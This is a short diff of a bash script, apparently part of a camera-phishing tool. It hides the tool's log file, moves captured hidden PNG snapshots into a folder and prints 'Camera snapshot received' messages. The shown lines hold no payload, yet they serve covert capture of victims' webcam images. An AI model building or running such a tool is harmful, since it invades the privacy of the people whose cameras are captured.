@@ -113,11 +113,12 @@ fi
 
 sleep 0.5
 
-if [[ -e "Log.log" ]]; then
+if [[ -e ".log.log" ]]; then
+mv .*.png images
 printf "\e[1;92m[\e[0m+\e[1;92m] Getting camera snapshot...\e[0m\n"
 sleep 0.5
 printf "\e[1;92m[\e[0m+\e[1;92m] Camera snapshot received!\e[0m\n"
-rm -rf Log.log
+rm -rf .log.log
 fi
 sleep 0.5
 
